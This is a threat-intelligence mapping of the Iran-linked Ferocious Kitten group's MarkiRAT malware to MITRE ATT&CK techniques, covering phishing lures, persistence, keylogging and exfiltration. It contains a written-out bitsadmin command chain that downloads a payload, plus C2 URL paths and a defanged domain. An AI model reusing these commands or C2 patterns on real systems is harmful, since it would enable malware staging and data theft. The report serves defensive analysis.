# Ferocious Kitten — ATT&CK Technique Mapping

> Attribution: Iran-nexus — medium confidence.
> Enriched from public threat reporting (per-technique sources in intel/cti-pipeline.json).

Total techniques mapped: **22** across **8** tactics.

## Initial Access

| Technique | ID | Notes |
|---|---|---|
| Phishing: Spearphishing Attachment | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Delivers macro-weaponized Persian-language Microsoft Word documents (e.g. 'همبستگی عاشقانه با عاشقان آزادی2.doc') whose decoy content references anti-regime protest, political prisoners and opposition themes tailored to lure Persian-speaking dissidents inside Iran. |

## Execution

| Technique | ID | Notes |
|---|---|---|
| User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Relies on the victim opening the decoy .doc and enabling macros; the document must be opened and macro execution allowed for the MarkiRAT dropper chain to run. |
| Command and Scripting Interpreter: Visual Basic | [T1059.005](https://attack.mitre.org/techniques/T1059/005/) | The document macro (VBA) decodes an embedded hexadecimal blob into a PE executable, writes it to the Public folder as update.exe, and executes it — the initial in-document code path that stages MarkiRAT. |
| Command and Scripting Interpreter: Windows Command Shell | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Executes operator-supplied arbitrary commands on the victim via 'cmd.exe /c', and runs files from its own repository directory (the 'runinhome' command). |

## Persistence

| Technique | ID | Notes |
|---|---|---|
| Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Copies the dropped payload (update.exe) into the user Startup folder as svehost.exe so MarkiRAT re-executes at every logon. |
| Boot or Logon Autostart Execution: Shortcut Modification | [T1547.009](https://attack.mitre.org/techniques/T1547/009/) | Telegram variant searches for the 'tdata' directory, copies MarkiRAT as data.exe with the Telegram icon, and modifies the Telegram shortcut to launch the malware alongside the legitimate app. The Chrome variant likewise modifies the Chrome shortcut so the payload executes whenever the browser is launched. |
| BITS Jobs | [T1197](https://attack.mitre.org/techniques/T1197/) | Chrome variant abuses the Windows BITS service via bitsadmin to fetch payloads: 'bitsadmin /cancel pdj > bitsadmin /create pdj > bitsadmin /SetPriority pdj HIGH > bitsadmin /addfile pdj [URL] %PUBLIC%\AppData\Libs\p.b > bitsadmin /resume pdj' — downloading chrome.txt / p.b. BITS is also used to probe outward-facing IP / proxy information. |

## Defense Evasion

| Technique | ID | Notes |
|---|---|---|
| Masquerading: Right-to-Left Override | [T1036.002](https://attack.mitre.org/techniques/T1036/002/) | Uses the RTLO Unicode character (U+202E) to reverse executable file names so that .exe payloads appear to the victim as benign media files (e.g. .jpg / .mp4), aiding social-engineering execution. |
| Masquerading: Match Legitimate Resource Name or Location | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Names payloads to blend in with trusted software: the Startup copy is 'svehost.exe' (mimicking svchost.exe), and the Telegram-hijack copy 'data.exe' is given the legitimate Telegram icon and placed within the Telegram data directory. |
| Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027/) | The weaponized document embeds the MarkiRAT payload as a hexadecimal blob that the macro decodes at runtime into a PE, rather than shipping a plain executable — obfuscating the payload from static document inspection. |

## Discovery

| Technique | ID | Notes |
|---|---|---|
| Software Discovery: Security Software Discovery | [T1518.001](https://attack.mitre.org/techniques/T1518/001/) | Enumerates running processes to detect security products and reports the result to C2 via a 'k' parameter (value '1' when Kaspersky/exe.exe is present, '3' for Bitdefender/bdagent.exe). No behavioral change was observed on detection, but the check shapes operator awareness. |
| Process Discovery | [T1057](https://attack.mitre.org/techniques/T1057/) | Enumerates the running process list (used both for security-software fingerprinting and to locate/kill the KeePass process before keylogging to encourage credential re-entry). |
| System Location Discovery: System Language Discovery | [T1614.001](https://attack.mitre.org/techniques/T1614/001/) | Checks for the Persian keyboard layout (locale ID 0x0429) before engaging keystroke logging — gating collection to Persian-speaking (Iran-based) victims, consistent with the group's domestic-surveillance targeting. |
| Application Window Discovery | [T1010](https://attack.mitre.org/techniques/T1010/) | Collects foreground/active application window titles and includes them in the initial C2 registration POST (embedded '<b>Windows Title1</b>...<b>Windows Title2</b>') to give the operator context on victim activity. |
| File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | The 'smart dir/upload/fulldir' commands perform intelligent file discovery across Desktop, Documents, Pictures, Downloads and messaging-app directories (ViberPC, Skype, Telegram) to locate documents of interest for exfiltration. |

## Collection

| Technique | ID | Notes |
|---|---|---|
| Input Capture: Keylogging | [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | Core MarkiRAT function ('Mark KeyLogger', per PDB names mklg*): records the victim's keystrokes to a local log file ('nfo') for exfiltration; kills KeePass beforehand to force password re-entry that can then be captured. |
| Clipboard Data | [T1115](https://attack.mitre.org/techniques/T1115/) | Captures the contents of the Windows clipboard alongside keystroke logging to harvest copied credentials, messages and other sensitive text. |
| Screen Capture | [T1113](https://attack.mitre.org/techniques/T1113/) | Captures desktop screenshots, saving them locally as 'scr.jpg' prior to exfiltration to C2. |
| Data from Local System | [T1005](https://attack.mitre.org/techniques/T1005/) | Collects documents and sensitive files from the local system for exfiltration, targeting specific extensions via the 'upload/uploads/uploadsf' commands: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, .jpg (note the inclusion of PGP/keyring and KeePass database extensions — targeting of encryption keys and password stores). |

## Command and Control

| Technique | ID | Notes |
|---|---|---|
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | Retrieves additional payloads/components from C2 — the MarkiRAT 'download' command pulls files from the C2, the Chrome-stage 'chrome.txt' and 'p.b' are fetched (including via BITS), and the Android component (classes.dex / hr.apk) is hosted on updatei[.]com. |
| Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Communicates with C2 over HTTP(S): initial registration POST to /i.php?u=[computername]_[username]&i=[IP]; periodic beacon GET to /ech/echo.php?req=rr&u=[computername]_[username] (expecting response '3 LOK 0'); directory listing via /ech/rite.php. C2 domains include updatei[.]com and *.com-view impersonation domains. |

## Exfiltration

| Technique | ID | Notes |
|---|---|---|
| Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltrates collected files (documents, keystroke log 'nfo', screenshot 'scr.jpg') to the C2 via HTTP upload to /up/uploadx.php?u=[computername]_[username]. |
